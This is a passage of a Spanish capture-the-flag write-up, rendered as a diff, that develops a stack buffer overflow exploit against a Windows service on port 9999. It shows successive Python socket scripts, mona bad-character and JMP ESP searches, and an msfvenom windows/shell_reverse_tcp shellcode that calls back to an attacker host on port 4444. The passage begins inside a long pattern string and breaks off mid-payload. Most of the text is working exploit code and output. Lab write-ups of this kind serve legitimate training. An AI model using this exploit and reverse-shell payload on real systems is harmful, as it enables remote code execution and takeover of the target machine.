p5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk
+</code></pre></div>
+<p>Enviamos con nc el mensaje</p>
+<p><img alt="alt text" src="img/image-4.png" /></p>
+<p>Encontramos en la de FUZZ que el cambio del EIP es <code>31704330</code></p>
+<p><img alt="alt text" src="img/image-5.png" /></p>
+<p>Con esto hemos encontrado que enviado <code>2012</code> ocurre el cambio</p>
+<div class="highlight"><pre><span></span><code>msf-pattern_offset<span class="w"> </span>-l<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-q<span class="w"> </span><span class="m">31704330</span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Exact<span class="w"> </span>match<span class="w"> </span>at<span class="w"> </span>offset<span class="w"> </span><span class="m">2012</span>
+</code></pre></div>
+<p>Creamos Payload con python</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;rdrgox&quot;</span>
+<span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">2012</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="mi">4</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Enviado Paylaod...&quot;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;192.168.159.134&#39;</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">username</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">except</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;no se puede conectar al servidor&quot;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</code></pre></div>
+<p>Hemos logrado controlar el EIP</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>overflow.py
+Enviado<span class="w"> </span>Paylaod...
+</code></pre></div>
+<p><img alt="alt text" src="img/image-6.png" /></p>
+<h3 id="shellcode">Shellcode<a class="headerlink" href="#shellcode" title="Permanent link">&para;</a></h3>
+<p>Asignación de espacio para Shellcode</p>
+<p>modificamos nuestro payload para averiguar donde se dirigir los caracteres de C introducidos </p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;rdrgox&quot;</span>
+<span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">2012</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;C&quot;</span> <span class="o">*</span> <span class="mi">200</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Enviado Paylaod...&quot;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;192.168.159.134&#39;</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">username</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">except</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;no se puede conectar al servidor&quot;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image-7.png" /></p>
+<p><img alt="alt text" src="img/image-8.png" /></p>
+<h3 id="bytearrays">Bytearrays<a class="headerlink" href="#bytearrays" title="Permanent link">&para;</a></h3>
+<p>Generación de Bytearrays y detection de batchars</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># con este comnado averiguamos donde gaurdar workingfolder</span>
+!mona<span class="w"> </span>config
+
+<span class="c1"># aca introducimos donde guardar el bytearay </span>
+!mona<span class="w"> </span>config<span class="w"> </span>-set<span class="w"> </span>workingfolder<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\r</span>odrigo<span class="se">\D</span>esktop<span class="se">\b</span>rainstorm
+
+<span class="c1"># geenramos bytearray</span>
+!mona<span class="w"> </span>bytearray
+
+<span class="c1"># quitar nullbyte</span>
+!mona<span class="w"> </span>bytearray<span class="w"> </span>-cpb<span class="w"> </span><span class="s1">&#39;\x00&#39;</span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image-9.png" /></p>
+<p><img alt="alt text" src="img/image-10.png" /></p>
+<p>Hemos generado el bytearray</p>
+<p><img alt="alt text" src="img/image-11.png" /></p>
+<p><img alt="alt text" src="img/image-12.png" /></p>
+<p>Agregamos el badchar y enviamos el payload</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;rdrgox&quot;</span>
+<span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">2012</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="mi">4</span>
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Enviado Paylaod...&quot;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;192.168.159.134&#39;</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">username</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span> <span class="o">+</span> <span class="n">badchars</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">except</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;no se puede conectar al servidor&quot;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</code></pre></div>
+<p>Observamos que los characters van al ESP</p>
+<p><img alt="alt text" src="img/image-13.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># buscamos donde coincida comienza el cambio del ESP</span>
+!mona<span class="w"> </span>compare<span class="w"> </span>-a<span class="w"> </span>0x01A4EEC0
+
+<span class="c1"># buscamos la comparación</span>
+!mona<span class="w"> </span>compare<span class="w"> </span>-a<span class="w"> </span>0x01A4EEC0<span class="w"> </span>-f<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\r</span>odrigo<span class="se">\D</span>esktop<span class="se">\b</span>rainstorm<span class="se">\b</span>ytearray.bin
+</code></pre></div>
+<p><img alt="alt text" src="img/image-14.png" /></p>
+<p>Con esto comprobamos que no hay mas Badchars.</p>
+<h3 id="opcodes">OpCodes<a class="headerlink" href="#opcodes" title="Permanent link">&para;</a></h3>
+<p>Búsqueda de OpCodes para entrar al ESP y cargar nuestro Shellcode</p>
+<p>ahora que no tenemos badchar debemos encontrar el punto de salto para el ESP, el cual hemos encontrado en el dll essfunc.dll <code>625014df</code></p>
+<div class="highlight"><pre><span></span><code>!mona<span class="w"> </span>jmp<span class="w"> </span>-r<span class="w"> </span>esp<span class="w"> </span>-cpb<span class="w"> </span><span class="s2">&quot;\x00&quot;</span><span class="w"> </span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image-15.png" /></p>
+<p>Volvemos a cargar el Immunity Buscamos el salto al ESP, y colocamos un breakpoint con F2,</p>
+<p><img alt="alt text" src="img/image-16.png" /></p>
+<p><img alt="alt text" src="img/image-17.png" /></p>
+<p>Modificamos nuestro Script volvemos a correr</p>
+<div class="highlight"><pre><span></span><code>import<span class="w"> </span>socket
+import<span class="w"> </span>sys
+
+<span class="nv">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>b<span class="s2">&quot;rdrgox&quot;</span>
+<span class="nv">message</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>b<span class="s2">&quot;A&quot;</span><span class="w"> </span>*<span class="w"> </span><span class="m">2012</span><span class="w"> </span>+<span class="w"> </span>b<span class="s2">&quot;\xdf\x14\x50\x62&quot;</span>
+<span class="nv">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>b<span class="s2">&quot;&quot;</span>
+
+try:
+<span class="w">    </span>print<span class="o">(</span><span class="s2">&quot;Enviado Paylaod...&quot;</span><span class="o">)</span>
+<span class="w">    </span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,<span class="w"> </span>socket.SOCK_STREAM<span class="o">)</span>
+<span class="w">    </span>s.connect<span class="o">((</span><span class="s1">&#39;192.168.159.134&#39;</span>,9999<span class="o">))</span>
+<span class="w">    </span>s.recv<span class="o">(</span><span class="m">1024</span><span class="o">)</span>
+<span class="w">    </span>s.recv<span class="o">(</span><span class="m">1024</span><span class="o">)</span>
+<span class="w">    </span>s.send<span class="o">(</span>username<span class="w"> </span>+<span class="w"> </span>b<span class="s1">&#39;\r\n&#39;</span><span class="o">)</span>
+<span class="w">    </span>s.recv<span class="o">(</span><span class="m">1024</span><span class="o">)</span>
+<span class="w">    </span>s.send<span class="o">(</span>message<span class="w"> </span>+<span class="w"> </span>b<span class="s1">&#39;\r\n&#39;</span><span class="o">)</span>
+<span class="w">    </span>s.recv<span class="o">(</span><span class="m">1024</span><span class="o">)</span>
+<span class="w">    </span>s.close<span class="o">()</span>
+
+except:
+<span class="w">    </span>print<span class="o">(</span><span class="s2">&quot;no se puede conectar al servidor&quot;</span><span class="o">)</span>
+<span class="w">    </span>sys.exit<span class="o">()</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>overflow.py
+Enviado<span class="w"> </span>Paylaod...
+</code></pre></div>
+<p>Ahora debemos observar el Breakpoint que colocamos anteriormente</p>
+<p><img alt="alt text" src="img/image-18.png" /></p>
+<p>si volvemos a continuar, vemos que hemos logrado el salto al EIP</p>
+<p><img alt="alt text" src="img/image-19.png" /></p>
+<p>Generamos un payload con msfvenom</p>
+<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.159.128<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="nv">EXITFUNC</span><span class="o">=</span>thread<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;\x00&quot;</span><span class="w"> </span>-f<span class="w"> </span>c
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>platform<span class="w"> </span>was<span class="w"> </span>selected,<span class="w"> </span>choosing<span class="w"> </span>Msf::Module::Platform::Windows<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>payload
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>arch<span class="w"> </span>selected,<span class="w"> </span>selecting<span class="w"> </span>arch:<span class="w"> </span>x86<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>payload
+Found<span class="w"> </span><span class="m">11</span><span class="w"> </span>compatible<span class="w"> </span>encoders
+Attempting<span class="w"> </span>to<span class="w"> </span>encode<span class="w"> </span>payload<span class="w"> </span>with<span class="w"> </span><span class="m">1</span><span class="w"> </span>iterations<span class="w"> </span>of<span class="w"> </span>x86/shikata_ga_nai
+x86/shikata_ga_nai<span class="w"> </span>succeeded<span class="w"> </span>with<span class="w"> </span>size<span class="w"> </span><span class="m">351</span><span class="w"> </span><span class="o">(</span><span class="nv">iteration</span><span class="o">=</span><span class="m">0</span><span class="o">)</span>
+x86/shikata_ga_nai<span class="w"> </span>chosen<span class="w"> </span>with<span class="w"> </span>final<span class="w"> </span>size<span class="w"> </span><span class="m">351</span>
+Payload<span class="w"> </span>size:<span class="w"> </span><span class="m">351</span><span class="w"> </span>bytes
+Final<span class="w"> </span>size<span class="w"> </span>of<span class="w"> </span>c<span class="w"> </span>file:<span class="w"> </span><span class="m">1506</span><span class="w"> </span>bytes
+unsigned<span class="w"> </span>char<span class="w"> </span>buf<span class="o">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
+<span class="s2">&quot;\xda\xdf\xd9\x74\x24\xf4\xba\xe9\x7b\x83\xf3\x58\x31\xc9&quot;</span>
+<span class="s2">&quot;\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\xb9\x68\x61\x06\xc5&quot;</span>
+<span class="s2">&quot;\x67\xe7\xe9\x35\x78\x88\x60\xd0\x49\x88\x17\x91\xfa\x38&quot;</span>
+<span class="s2">&quot;\x53\xf7\xf6\xb3\x31\xe3\x8d\xb6\x9d\x04\x25\x7c\xf8\x2b&quot;</span>
+<span class="s2">&quot;\xb6\x2d\x38\x2a\x34\x2c\x6d\x8c\x05\xff\x60\xcd\x42\xe2&quot;</span>
+<span class="s2">&quot;\x89\x9f\x1b\x68\x3f\x0f\x2f\x24\xfc\xa4\x63\xa8\x84\x59&quot;</span>
+<span class="s2">&quot;\x33\xcb\xa5\xcc\x4f\x92\x65\xef\x9c\xae\x2f\xf7\xc1\x8b&quot;</span>
+<span class="s2">&quot;\xe6\x8c\x32\x67\xf9\x44\x0b\x88\x56\xa9\xa3\x7b\xa6\xee&quot;</span>
+<span class="s2">&quot;\x04\x64\xdd\x06\x77\x19\xe6\xdd\x05\xc5\x63\xc5\xae\x8e&quot;</span>
+<span class="s2">&quot;\xd4\x21\x4e\x42\x82\xa2\x5c\x2f\xc0\xec\x40\xae\x05\x87&quot;</span>
+<span class="s2">&quot;\x7d\x3b\xa8\x47\xf4\x7f\x8f\x43\x5c\xdb\xae\xd2\x38\x8a&quot;</span>
+<span class="s2">&quot;\xcf\x04\xe3\x73\x6a\x4f\x0e\x67\x07\x12\x47\x44\x2a\xac&quot;</span>
+<span class="s2">&quot;\x97\xc2\x3d\xdf\xa5\x4d\x96\x77\x86\x06\x30\x80\xe9\x3c&quot;</span>
+<span class="s2">&quot;\x84\x1e\x14\xbf\xf5\x37\xd3\xeb\xa5\x2f\xf2\x93\x2d\xaf&quot;</span>
+<span class="s2">&quot;\xfb\x41\xe1\xff\x53\x3a\x42\xaf\x13\xea\x2a\xa5\x9b\xd5&quot;</span>
+<span class="s2">&quot;\x4b\xc6\x71\x7e\xe1\x3d\x12\x41\x5e\xa2\x62\x29\x9d\xdc&quot;</span>
+<span class="s2">&quot;\x73\xf6\x28\x3a\x19\x16\x7d\x95\xb6\x8f\x24\x6d\x26\x4f&quot;</span>
+<span class="s2">&quot;\xf3\x08\x68\xdb\xf0\xed\x27\x2c\x7c\xfd\xd0\xdc\xcb\x5f&quot;</span>
+<span class="s2">&quot;\x76\xe2\xe1\xf7\x14\x71\x6e\x07\x52\x6a\x39\x50\x33\x5c&quot;</span>
+<span class="s2">&quot;\x30\x34\xa9\xc7\xea\x2a\x30\x91\xd5\xee\xef\x62\xdb\xef&quot;</span>
+<span class="s2">&quot;\x62\xde\xff\xff\xba\xdf\xbb\xab\x12\xb6\x15\x05\xd5\x60&quot;</span>
+<span class="s2">&quot;\xd4\xff\x8f\xdf\xbe\x97\x56\x2c\x01\xe1\x56\x79\xf7\x0d&quot;</span>
+<span class="s2">&quot;\xe6\xd4\x4e\x32\xc7\xb0\x46\x4b\x35\x21\xa8\x86\xfd\x41&quot;</span>
+<span class="s2">&quot;\x4b\x02\x08\xea\xd2\xc7\xb1\x77\xe5\x32\xf5\x81\x66\xb6&quot;</span>
+<span class="s2">&quot;\x86\x75\x76\xb3\x83\x32\x30\x28\xfe\x2b\xd5\x4e\xad\x4c&quot;</span>
+<span class="s2">&quot;\xfc&quot;</span><span class="p">;</span>
+</code></pre></div>
+<p>Modificamos nuestro Script de python nuevamente</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;rdrgox&quot;</span>
+<span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">2012</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xdf\x14\x50\x62</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">32</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xda\xdf\xd9\x74\x24\xf4\xba\xe9\x7b\x83\xf3\x58\x31\xc9</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\xb9\x68\x61\x06\xc5</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x67\xe7\xe9\x35\x78\x88\x60\xd0\x49\x88\x17\x91\xfa\x38</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x53\xf7\xf6\xb3\x31\xe3\x8d\xb6\x9d\x04\x25\x7c\xf8\x2b</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xb6\x2d\x38\x2a\x34\x2c\x6d\x8c\x05\xff\x60\xcd\x42\xe2</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x89\x9f\x1b\x68\x3f\x0f\x2f\x24\xfc\xa4\x63\xa8\x84\x59</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x33\xcb\xa5\xcc\x4f\x92\x65\xef\x9c\xae\x2f\xf7\xc1\x8b</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xe6\x8c\x32\x67\xf9\x44\x0b\x88\x56\xa9\xa3\x7b\xa6\xee</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x04\x64\xdd\x06\x77\x19\xe6\xdd\x05\xc5\x63\xc5\xae\x8e</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd4\x21\x4e\x42\x82\xa2\x5c\x2f\xc0\xec\x40\xae\x05\x87</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x7d\x3b\xa8\x47\xf4\x7f\x8f\x43\x5c\xdb\xae\xd2\x38\x8a</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xcf\x04\xe3\x73\x6a\x4f\x0e\x67\x07\x12\x47\x44\x2a\xac</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x97\xc2\x3d\xdf\xa5\x4d\x96\x77\x86\x06\x30\x80\xe9\x3c</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x84\x1e\x14\xbf\xf5\x37\xd3\xeb\xa5\x2f\xf2\x93\x2d\xaf</span><span class="s2">&quot;</span>
